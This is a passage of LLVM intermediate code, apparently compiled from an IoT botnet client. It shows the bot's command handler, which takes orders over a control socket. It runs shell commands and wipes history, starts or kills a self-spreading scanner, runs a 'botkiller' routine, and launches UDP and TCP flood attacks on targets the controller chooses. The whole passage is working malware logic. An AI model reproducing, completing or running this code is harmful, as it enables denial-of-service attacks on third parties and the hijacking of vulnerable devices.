  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  %46 = alloca i32, align 4
  %47 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strcmp(i8* %50, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.431, i32 0, i32 0)) #10
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %94, label %53

; <label>:53:                                     ; preds = %2
  %54 = load i8**, i8*** %4, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 1
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @strcmp(i8* %56, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.432, i32 0, i32 0)) #10
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %63, label %59

; <label>:59:                                     ; preds = %53
  %60 = call i32 @system(i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.433, i32 0, i32 0))
  call void @ClearHistory()
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.434, i32 0, i32 0))
  br label %63

; <label>:63:                                     ; preds = %59, %53
  %64 = load i8**, i8*** %4, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 1
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @strcmp(i8* %66, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0)) #10
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %73, label %69

; <label>:69:                                     ; preds = %63
  %70 = call i32 @system(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.436, i32 0, i32 0))
  call void @ClearHistory()
  %71 = load i32, i32* @mainCommSock, align 4
  %72 = call i32 (i32, i8*, ...) @sockprintf(i32 %71, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.437, i32 0, i32 0))
  br label %73

; <label>:73:                                     ; preds = %69, %63
  %74 = load i8**, i8*** %4, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 1
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @strcmp(i8* %76, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i32 0, i32 0)) #10
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %83, label %79

; <label>:79:                                     ; preds = %73
  %80 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.439, i32 0, i32 0))
  call void @ClearHistory()
  %81 = load i32, i32* @mainCommSock, align 4
  %82 = call i32 (i32, i8*, ...) @sockprintf(i32 %81, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.440, i32 0, i32 0))
  br label %83

; <label>:83:                                     ; preds = %79, %73
  %84 = load i8**, i8*** %4, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @strcmp(i8* %86, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.441, i32 0, i32 0)) #10
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %93, label %89

; <label>:89:                                     ; preds = %83
  %90 = call i32 @system(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.442, i32 0, i32 0))
  call void @ClearHistory()
  %91 = load i32, i32* @mainCommSock, align 4
  %92 = call i32 (i32, i8*, ...) @sockprintf(i32 %91, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.443, i32 0, i32 0))
  br label %93

; <label>:93:                                     ; preds = %89, %83
  br label %94

; <label>:94:                                     ; preds = %93, %2
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 0
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @strcmp(i8* %97, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0)) #10
  %99 = icmp ne i32 %98, 0
  br i1 %99, label %103, label %100

; <label>:100:                                    ; preds = %94
  %101 = load i32, i32* @mainCommSock, align 4
  %102 = call i32 (i32, i8*, ...) @sockprintf(i32 %101, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.444, i32 0, i32 0))
  br label %920

; <label>:103:                                    ; preds = %94
  %104 = load i8**, i8*** %4, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 0
  %106 = load i8*, i8** %105, align 8
  %107 = call i32 @strcmp(i8* %106, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.445, i32 0, i32 0)) #10
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %113, label %109

; <label>:109:                                    ; preds = %103
  %110 = load i32, i32* @mainCommSock, align 4
  %111 = call i32 @getdtablesize() #2
  %112 = call i32 (i32, i8*, ...) @sockprintf(i32 %110, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i32 0, i32 0), i32 %111)
  br label %920

; <label>:113:                                    ; preds = %103
  %114 = load i8**, i8*** %4, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 0
  %116 = load i8*, i8** %115, align 8
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0)) #10
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %122, label %119

; <label>:119:                                    ; preds = %113
  %120 = load i32, i32* @mainCommSock, align 4
  %121 = call i32 (i32, i8*, ...) @sockprintf(i32 %120, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.446, i32 0, i32 0))
  call void (i32, ...) bitcast (void ()* @binsBins to void (i32, ...)*)(i32 1)
  br label %920

; <label>:122:                                    ; preds = %113
  %123 = load i8**, i8*** %4, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 0
  %125 = load i8*, i8** %124, align 8
  %126 = call i32 @strcmp(i8* %125, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.447, i32 0, i32 0)) #10
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %184, label %128

; <label>:128:                                    ; preds = %122
  %129 = load i8**, i8*** %4, align 8
  %130 = getelementptr inbounds i8*, i8** %129, i64 1
  %131 = load i8*, i8** %130, align 8
  %132 = call i32 @strcmp(i8* %131, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i32 0, i32 0)) #10
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %143, label %134

; <label>:134:                                    ; preds = %128
  %135 = load i32, i32* @scanPid, align 4
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %137, label %138

; <label>:137:                                    ; preds = %134
  br label %920

; <label>:138:                                    ; preds = %134
  %139 = load i32, i32* @scanPid, align 4
  %140 = call i32 @kill(i32 %139, i32 9) #2
  %141 = load i32, i32* @mainCommSock, align 4
  %142 = call i32 (i32, i8*, ...) @sockprintf(i32 %141, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.448, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  br label %143

; <label>:143:                                    ; preds = %138, %128
  %144 = load i8**, i8*** %4, align 8
  %145 = getelementptr inbounds i8*, i8** %144, i64 1
  %146 = load i8*, i8** %145, align 8
  %147 = call i32 @strcmp(i8* %146, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.449, i32 0, i32 0)) #10
  %148 = icmp ne i32 %147, 0
  br i1 %148, label %183, label %149

; <label>:149:                                    ; preds = %143
  %150 = load i32, i32* @scanPid, align 4
  %151 = icmp ne i32 %150, 0
  br i1 %151, label %152, label %153

; <label>:152:                                    ; preds = %149
  br label %920

; <label>:153:                                    ; preds = %149
  %154 = call i32 @fork() #2
  store i32 %154, i32* %5, align 4
  store i32 8192, i32* %7, align 4
  %155 = call i64 @sysconf(i32 84) #2
  %156 = mul nsw i64 %155, 64
  %157 = trunc i64 %156 to i32
  store i32 %157, i32* %8, align 4
  store i32 10, i32* %9, align 4
  %158 = load i32, i32* %5, align 4
  %159 = icmp sgt i32 %158, 0
  br i1 %159, label %160, label %162

; <label>:160:                                    ; preds = %153
  %161 = load i32, i32* %5, align 4
  store i32 %161, i32* @scanPid, align 4
  br label %920

; <label>:162:                                    ; preds = %153
  %163 = load i32, i32* %5, align 4
  %164 = icmp eq i32 %163, -1
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %162
  br label %920

; <label>:166:                                    ; preds = %162
  br label %167

; <label>:167:                                    ; preds = %166
  %168 = load i32, i32* @mainCommSock, align 4
  %169 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %170 = call i8* @inet_ntoa(i32 %169) #2
  %171 = call i32 (i32, i8*, ...) @sockprintf(i32 %168, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.450, i32 0, i32 0), i8* %170)
  store i32 0, i32* %6, align 4
  br label %172

; <label>:172:                                    ; preds = %179, %167
  %173 = load i32, i32* %6, align 4
  %174 = load i32, i32* %8, align 4
  %175 = icmp slt i32 %173, %174
  br i1 %175, label %176, label %182

; <label>:176:                                    ; preds = %172
  %177 = load i32, i32* %9, align 4
  %178 = load i32, i32* %7, align 4
  call void @StartTheLelz(i32 %177, i32 %178)
  br label %179

; <label>:179:                                    ; preds = %176
  %180 = load i32, i32* %6, align 4
  %181 = add nsw i32 %180, 1
  store i32 %181, i32* %6, align 4
  br label %172

; <label>:182:                                    ; preds = %172
  call void @_exit(i32 0) #12
  unreachable

; <label>:183:                                    ; preds = %143
  br label %184

; <label>:184:                                    ; preds = %183, %122
  %185 = load i8**, i8*** %4, align 8
  %186 = getelementptr inbounds i8*, i8** %185, i64 0
  %187 = load i8*, i8** %186, align 8
  %188 = call i32 @strcmp(i8* %187, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0)) #10
  %189 = icmp ne i32 %188, 0
  br i1 %189, label %199, label %190

; <label>:190:                                    ; preds = %184
  %191 = call i32 @listFork()
  %192 = icmp ne i32 %191, 0
  br i1 %192, label %198, label %193

; <label>:193:                                    ; preds = %190
  %194 = load i32, i32* @mainCommSock, align 4
  %195 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %196 = call i8* @inet_ntoa(i32 %195) #2
  %197 = call i32 (i32, i8*, ...) @sockprintf(i32 %194, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.452, i32 0, i32 0), i8* %196)
  call void @botkiller()
  call void @_exit(i32 0) #12
  unreachable

; <label>:198:                                    ; preds = %190
  br label %199

; <label>:199:                                    ; preds = %198, %184
  %200 = load i8**, i8*** %4, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 0
  %202 = load i8*, i8** %201, align 8
  %203 = call i32 @strcmp(i8* %202, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.453, i32 0, i32 0)) #10
  %204 = icmp ne i32 %203, 0
  br i1 %204, label %210, label %205

; <label>:205:                                    ; preds = %199
  %206 = load i32, i32* @mainCommSock, align 4
  %207 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %208 = call i8* @inet_ntoa(i32 %207) #2
  %209 = call i32 (i32, i8*, ...) @sockprintf(i32 %206, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.454, i32 0, i32 0), i8* %208)
  br label %920

; <label>:210:                                    ; preds = %199
  %211 = load i8**, i8*** %4, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 0
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @strcmp(i8* %213, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.455, i32 0, i32 0)) #10
  %215 = icmp ne i32 %214, 0
  br i1 %215, label %361, label %216

; <label>:216:                                    ; preds = %210
  %217 = load i32, i32* %3, align 4
  %218 = icmp slt i32 %217, 6
  br i1 %218, label %270, label %219

; <label>:219:                                    ; preds = %216
  %220 = load i8**, i8*** %4, align 8
  %221 = getelementptr inbounds i8*, i8** %220, i64 3
  %222 = load i8*, i8** %221, align 8
  %223 = call i32 @atoi(i8* %222) #10
  %224 = icmp eq i32 %223, -1
  br i1 %224, label %270, label %225

; <label>:225:                                    ; preds = %219
  %226 = load i8**, i8*** %4, align 8
  %227 = getelementptr inbounds i8*, i8** %226, i64 2
  %228 = load i8*, i8** %227, align 8
  %229 = call i32 @atoi(i8* %228) #10
  %230 = icmp eq i32 %229, -1
  br i1 %230, label %270, label %231

; <label>:231:                                    ; preds = %225
  %232 = load i8**, i8*** %4, align 8
  %233 = getelementptr inbounds i8*, i8** %232, i64 4
  %234 = load i8*, i8** %233, align 8
  %235 = call i32 @atoi(i8* %234) #10
  %236 = icmp eq i32 %235, -1
  br i1 %236, label %270, label %237

; <label>:237:                                    ; preds = %231
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 5
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @atoi(i8* %240) #10
  %242 = icmp eq i32 %241, -1
  br i1 %242, label %270, label %243

; <label>:243:                                    ; preds = %237
  %244 = load i8**, i8*** %4, align 8
  %245 = getelementptr inbounds i8*, i8** %244, i64 5
  %246 = load i8*, i8** %245, align 8
  %247 = call i32 @atoi(i8* %246) #10
  %248 = icmp sgt i32 %247, 65536
  br i1 %248, label %270, label %249

; <label>:249:                                    ; preds = %243
  %250 = load i8**, i8*** %4, align 8
  %251 = getelementptr inbounds i8*, i8** %250, i64 5
  %252 = load i8*, i8** %251, align 8
  %253 = call i32 @atoi(i8* %252) #10
  %254 = icmp sgt i32 %253, 65500
  br i1 %254, label %270, label %255

; <label>:255:                                    ; preds = %249
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 4
  %258 = load i8*, i8** %257, align 8
  %259 = call i32 @atoi(i8* %258) #10
  %260 = icmp sgt i32 %259, 32
  br i1 %260, label %270, label %261

; <label>:261:                                    ; preds = %255
  %262 = load i32, i32* %3, align 4
  %263 = icmp eq i32 %262, 7
  br i1 %263, label %264, label %273

; <label>:264:                                    ; preds = %261
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds i8*, i8** %265, i64 6
  %267 = load i8*, i8** %266, align 8
  %268 = call i32 @atoi(i8* %267) #10
  %269 = icmp slt i32 %268, 1
  br i1 %269, label %270, label %273

; <label>:270:                                    ; preds = %264, %255, %249, %243, %237, %231, %225, %219, %216
  %271 = load i32, i32* @mainCommSock, align 4
  %272 = call i32 (i32, i8*, ...) @sockprintf(i32 %271, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.456, i32 0, i32 0))
  br label %920

; <label>:273:                                    ; preds = %264, %261
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 1
  %276 = load i8*, i8** %275, align 8
  store i8* %276, i8** %10, align 8
  %277 = load i8**, i8*** %4, align 8
  %278 = getelementptr inbounds i8*, i8** %277, i64 2
  %279 = load i8*, i8** %278, align 8
  %280 = call i32 @atoi(i8* %279) #10
  store i32 %280, i32* %11, align 4
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 3
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 @atoi(i8* %283) #10
  store i32 %284, i32* %12, align 4
  %285 = load i8**, i8*** %4, align 8
  %286 = getelementptr inbounds i8*, i8** %285, i64 4
  %287 = load i8*, i8** %286, align 8
  %288 = call i32 @atoi(i8* %287) #10
  store i32 %288, i32* %13, align 4
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 5
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #10
  store i32 %292, i32* %14, align 4
  %293 = load i32, i32* %3, align 4
  %294 = icmp sgt i32 %293, 6
  br i1 %294, label %295, label %300

; <label>:295:                                    ; preds = %273
  %296 = load i8**, i8*** %4, align 8
  %297 = getelementptr inbounds i8*, i8** %296, i64 6
  %298 = load i8*, i8** %297, align 8
  %299 = call i32 @atoi(i8* %298) #10
  br label %301

; <label>:300:                                    ; preds = %273
  br label %301

; <label>:301:                                    ; preds = %300, %295
  %302 = phi i32 [ %299, %295 ], [ 1000, %300 ]
  store i32 %302, i32* %15, align 4
  %303 = load i32, i32* %3, align 4
  %304 = icmp sgt i32 %303, 7
  br i1 %304, label %305, label %310

; <label>:305:                                    ; preds = %301
  %306 = load i8**, i8*** %4, align 8
  %307 = getelementptr inbounds i8*, i8** %306, i64 7
  %308 = load i8*, i8** %307, align 8
  %309 = call i32 @atoi(i8* %308) #10
  br label %311

; <label>:310:                                    ; preds = %301
  br label %311

; <label>:311:                                    ; preds = %310, %305
  %312 = phi i32 [ %309, %305 ], [ 1000000, %310 ]
  store i32 %312, i32* %16, align 4
  %313 = load i32, i32* %3, align 4
  %314 = icmp sgt i32 %313, 8
  br i1 %314, label %315, label %320

; <label>:315:                                    ; preds = %311
  %316 = load i8**, i8*** %4, align 8
  %317 = getelementptr inbounds i8*, i8** %316, i64 8
  %318 = load i8*, i8** %317, align 8
  %319 = call i32 @atoi(i8* %318) #10
  br label %321

; <label>:320:                                    ; preds = %311
  br label %321

; <label>:321:                                    ; preds = %320, %315
  %322 = phi i32 [ %319, %315 ], [ 0, %320 ]
  store i32 %322, i32* %17, align 4
  %323 = load i8*, i8** %10, align 8
  %324 = call i8* @strstr(i8* %323, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %325 = icmp ne i8* %324, null
  br i1 %325, label %326, label %347

; <label>:326:                                    ; preds = %321
  %327 = load i8*, i8** %10, align 8
  %328 = call i8* @strtok(i8* %327, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %328, i8** %18, align 8
  br label %329

; <label>:329:                                    ; preds = %344, %326
  %330 = load i8*, i8** %18, align 8
  %331 = icmp ne i8* %330, null
  br i1 %331, label %332, label %346

; <label>:332:                                    ; preds = %329
  %333 = call i32 @listFork()
  %334 = icmp ne i32 %333, 0
  br i1 %334, label %344, label %335

; <label>:335:                                    ; preds = %332
  %336 = load i8*, i8** %18, align 8
  %337 = load i32, i32* %11, align 4
  %338 = load i32, i32* %12, align 4
  %339 = load i32, i32* %13, align 4
  %340 = load i32, i32* %14, align 4
  %341 = load i32, i32* %15, align 4
  %342 = load i32, i32* %16, align 4
  %343 = load i32, i32* %17, align 4
  call void @sendUDP(i8* %336, i32 %337, i32 %338, i32 %339, i32 %340, i32 %341, i32 %342, i32 %343)
  call void @_exit(i32 0) #12
  unreachable

; <label>:344:                                    ; preds = %332
  %345 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %345, i8** %18, align 8
  br label %329

; <label>:346:                                    ; preds = %329
  br label %360

; <label>:347:                                    ; preds = %321
  %348 = call i32 @listFork()
  %349 = icmp ne i32 %348, 0
  br i1 %349, label %359, label %350

; <label>:350:                                    ; preds = %347
  %351 = load i8*, i8** %10, align 8
  %352 = load i32, i32* %11, align 4
  %353 = load i32, i32* %12, align 4
  %354 = load i32, i32* %13, align 4
  %355 = load i32, i32* %14, align 4
  %356 = load i32, i32* %15, align 4
  %357 = load i32, i32* %16, align 4
  %358 = load i32, i32* %17, align 4
  call void @sendUDP(i8* %351, i32 %352, i32 %353, i32 %354, i32 %355, i32 %356, i32 %357, i32 %358)
  call void @_exit(i32 0) #12
  unreachable

; <label>:359:                                    ; preds = %347
  br label %360

; <label>:360:                                    ; preds = %359, %346
  br label %920

; <label>:361:                                    ; preds = %210
  %362 = load i8**, i8*** %4, align 8
  %363 = getelementptr inbounds i8*, i8** %362, i64 0
  %364 = load i8*, i8** %363, align 8
  %365 = call i32 @strcmp(i8* %364, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.457, i32 0, i32 0)) #10
  %366 = icmp ne i32 %365, 0
  br i1 %366, label %490, label %367

; <label>:367:                                    ; preds = %361
  %368 = load i32, i32* %3, align 4
  %369 = icmp slt i32 %368, 6
  br i1 %369, label %412, label %370

; <label>:370:                                    ; preds = %367
  %371 = load i8**, i8*** %4, align 8
  %372 = getelementptr inbounds i8*, i8** %371, i64 3
  %373 = load i8*, i8** %372, align 8
  %374 = call i32 @atoi(i8* %373) #10
  %375 = icmp eq i32 %374, -1
  br i1 %375, label %412, label %376

; <label>:376:                                    ; preds = %370
  %377 = load i8**, i8*** %4, align 8
  %378 = getelementptr inbounds i8*, i8** %377, i64 2
  %379 = load i8*, i8** %378, align 8
  %380 = call i32 @atoi(i8* %379) #10
  %381 = icmp eq i32 %380, -1
  br i1 %381, label %412, label %382

; <label>:382:                                    ; preds = %376
  %383 = load i8**, i8*** %4, align 8
  %384 = getelementptr inbounds i8*, i8** %383, i64 4
  %385 = load i8*, i8** %384, align 8
  %386 = call i32 @atoi(i8* %385) #10
  %387 = icmp eq i32 %386, -1
  br i1 %387, label %412, label %388

; <label>:388:                                    ; preds = %382
  %389 = load i8**, i8*** %4, align 8
  %390 = getelementptr inbounds i8*, i8** %389, i64 4
  %391 = load i8*, i8** %390, align 8
  %392 = call i32 @atoi(i8* %391) #10
  %393 = icmp sgt i32 %392, 32
  br i1 %393, label %412, label %394

; <label>:394:                                    ; preds = %388
  %395 = load i32, i32* %3, align 4
  %396 = icmp sgt i32 %395, 6
  br i1 %396, label %397, label %403

; <label>:397:                                    ; preds = %394
  %398 = load i8**, i8*** %4, align 8
  %399 = getelementptr inbounds i8*, i8** %398, i64 6
  %400 = load i8*, i8** %399, align 8
  %401 = call i32 @atoi(i8* %400) #10
  %402 = icmp slt i32 %401, 0
  br i1 %402, label %412, label %403

; <label>:403:                                    ; preds = %397, %394
  %404 = load i32, i32* %3, align 4
  %405 = icmp eq i32 %404, 8
  br i1 %405, label %406, label %415

; <label>:406:                                    ; preds = %403
  %407 = load i8**, i8*** %4, align 8
  %408 = getelementptr inbounds i8*, i8** %407, i64 7
  %409 = load i8*, i8** %408, align 8
  %410 = call i32 @atoi(i8* %409) #10
  %411 = icmp slt i32 %410, 1
  br i1 %411, label %412, label %415

; <label>:412:                                    ; preds = %406, %397, %388, %382, %376, %370, %367
  %413 = load i32, i32* @mainCommSock, align 4
  %414 = call i32 (i32, i8*, ...) @sockprintf(i32 %413, i8* getelementptr inbounds ([186 x i8], [186 x i8]* @.str.458, i32 0, i32 0))
  br label %920

; <label>:415:                                    ; preds = %406, %403
  %416 = load i8**, i8*** %4, align 8
  %417 = getelementptr inbounds i8*, i8** %416, i64 1
  %418 = load i8*, i8** %417, align 8
  store i8* %418, i8** %19, align 8
  %419 = load i8**, i8*** %4, align 8
  %420 = getelementptr inbounds i8*, i8** %419, i64 2
  %421 = load i8*, i8** %420, align 8
  %422 = call i32 @atoi(i8* %421) #10
  store i32 %422, i32* %20, align 4
  %423 = load i8**, i8*** %4, align 8
  %424 = getelementptr inbounds i8*, i8** %423, i64 3
  %425 = load i8*, i8** %424, align 8
  %426 = call i32 @atoi(i8* %425) #10
  store i32 %426, i32* %21, align 4
  %427 = load i8**, i8*** %4, align 8
  %428 = getelementptr inbounds i8*, i8** %427, i64 4
  %429 = load i8*, i8** %428, align 8
  %430 = call i32 @atoi(i8* %429) #10
  store i32 %430, i32* %22, align 4
  %431 = load i8**, i8*** %4, align 8
  %432 = getelementptr inbounds i8*, i8** %431, i64 5
  %433 = load i8*, i8** %432, align 8
  store i8* %433, i8** %23, align 8
  %434 = load i32, i32* %3, align 4
  %435 = icmp eq i32 %434, 8
  br i1 %435, label %436, label %441

; <label>:436:                                    ; preds = %415
  %437 = load i8**, i8*** %4, align 8
  %438 = getelementptr inbounds i8*, i8** %437, i64 7
  %439 = load i8*, i8** %438, align 8
  %440 = call i32 @atoi(i8* %439) #10
  br label %442

; <label>:441:                                    ; preds = %415
  br label %442

; <label>:442:                                    ; preds = %441, %436
  %443 = phi i32 [ %440, %436 ], [ 10, %441 ]
  store i32 %443, i32* %24, align 4
  %444 = load i32, i32* %3, align 4
  %445 = icmp sgt i32 %444, 6
  br i1 %445, label %446, label %451

; <label>:446:                                    ; preds = %442
  %447 = load i8**, i8*** %4, align 8
  %448 = getelementptr inbounds i8*, i8** %447, i64 6
  %449 = load i8*, i8** %448, align 8
  %450 = call i32 @atoi(i8* %449) #10
  br label %452

; <label>:451:                                    ; preds = %442
  br label %452

; <label>:452:                                    ; preds = %451, %446
  %453 = phi i32 [ %450, %446 ], [ 0, %451 ]
  store i32 %453, i32* %25, align 4
  %454 = load i8*, i8** %19, align 8
  %455 = call i8* @strstr(i8* %454, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %456 = icmp ne i8* %455, null
  br i1 %456, label %457, label %477

; <label>:457:                                    ; preds = %452
  %458 = load i8*, i8** %19, align 8
  %459 = call i8* @strtok(i8* %458, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %459, i8** %26, align 8
  br label %460

; <label>:460:                                    ; preds = %474, %457
  %461 = load i8*, i8** %26, align 8
  %462 = icmp ne i8* %461, null
  br i1 %462, label %463, label %476

; <label>:463:                                    ; preds = %460
  %464 = call i32 @listFork()
  %465 = icmp ne i32 %464, 0
  br i1 %465, label %474, label %466

; <label>:466:                                    ; preds = %463
  %467 = load i8*, i8** %26, align 8
  %468 = load i32, i32* %20, align 4
  %469 = load i32, i32* %21, align 4
  %470 = load i32, i32* %22, align 4
  %471 = load i8*, i8** %23, align 8
  %472 = load i32, i32* %25, align 4
  %473 = load i32, i32* %24, align 4
  call void @sendTCP(i8* %467, i32 %468, i32 %469, i32 %470, i8* %471, i32 %472, i32 %473)
  call void @_exit(i32 0) #12
  unreachable

; <label>:474:                                    ; preds = %463
  %475 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %475, i8** %26, align 8
  br label %460

; <label>:476:                                    ; preds = %460
  br label %489

; <label>:477:                                    ; preds = %452
  %478 = call i32 @listFork()
  %479 = icmp ne i32 %478, 0
  br i1 %479, label %488, label %480

; <label>:480:                                    ; preds = %477
  %481 = load i8*, i8** %19, align 8
  %482 = load i32, i32* %20, align 4
  %483 = load i32, i32* %21, align 4
  %484 = load i32, i32* %22, align 4
  %485 = load i8*, i8** %23, align 8
  %486 = load i32, i32* %25, align 4
  %487 = load i32, i32* %24, align 4
  call void @sendTCP(i8* %481, i32 %482, i32 %483, i32 %484, i8* %485, i32 %486, i32 %487)
  call void @_exit(i32 0) #12
  unreachable

; <label>:488:                                    ; preds = %477
  br label %489

; <label>:489:                                    ; preds = %488, %476
  br label %490

; <label>:490:                                    ; preds = %489, %361
  %491 = load i8**, i8*** %4, align 8
  %492 = getelementptr inbounds i8*, i8** %491, i64 0
  %493 = load i8*, i8** %492, align 8
  %494 = call i32 @strcmp(i8* %493, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.459, i32 0, i32 0)) #10
  %495 = icmp ne i32 %494, 0
  br i1 %495, label %573, label %496

; <label>:496:                                    ; preds = %490
  %497 = load i32, i32* %3, align 4
  %498 = icmp slt i32 %497, 6
  br i1 %498, label %499, label %502

; <label>:499:                                    ; preds = %496
  %500 = load i32, i32* @mainCommSock, align 4
  %501 = call i32 (i32, i8*, ...) @sockprintf(i32 %500, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.460, i32 0, i32 0))
  br label %920

; <label>:502:                                    ; preds = %496
  %503 = load i8**, i8*** %4, align 8
  %504 = getelementptr inbounds i8*, i8** %503, i64 1
  %505 = load i8*, i8** %504, align 8
  %506 = call i8* @strstr(i8* %505, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %507 = icmp ne i8* %506, null
  br i1 %507, label %508, label %545

; <label>:508:                                    ; preds = %502
  %509 = load i8**, i8*** %4, align 8
  %510 = getelementptr inbounds i8*, i8** %509, i64 1
  %511 = load i8*, i8** %510, align 8
  %512 = call i8* @strtok(i8* %511, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %512, i8** %27, align 8
  br label %513

; <label>:513:                                    ; preds = %542, %508
  %514 = load i8*, i8** %27, align 8
  %515 = icmp ne i8* %514, null
  br i1 %515, label %516, label %544

; <label>:516:                                    ; preds = %513
  %517 = call i32 @listFork()
  %518 = icmp ne i32 %517, 0
  br i1 %518, label %542, label %519

; <label>:519:                                    ; preds = %516
  %520 = load i8**, i8*** %4, align 8
  %521 = getelementptr inbounds i8*, i8** %520, i64 1
  %522 = load i8*, i8** %521, align 8
  %523 = load i8**, i8*** %4, align 8
  %524 = getelementptr inbounds i8*, i8** %523, i64 2
  %525 = load i8*, i8** %524, align 8
  %526 = load i8**, i8*** %4, align 8
  %527 = getelementptr inbounds i8*, i8** %526, i64 3
  %528 = load i8*, i8** %527, align 8
  %529 = call i32 @atoi(i8* %528) #10
  %530 = trunc i32 %529 to i16
  %531 = load i8**, i8*** %4, align 8
  %532 = getelementptr inbounds i8*, i8** %531, i64 4
  %533 = load i8*, i8** %532, align 8
  %534 = load i8**, i8*** %4, align 8
  %535 = getelementptr inbounds i8*, i8** %534, i64 5
  %536 = load i8*, i8** %535, align 8
  %537 = call i32 @atoi(i8* %536) #10
  %538 = load i8**, i8*** %4, align 8
  %539 = getelementptr inbounds i8*, i8** %538, i64 6
  %540 = load i8*, i8** %539, align 8
  %541 = call i32 @atoi(i8* %540) #10
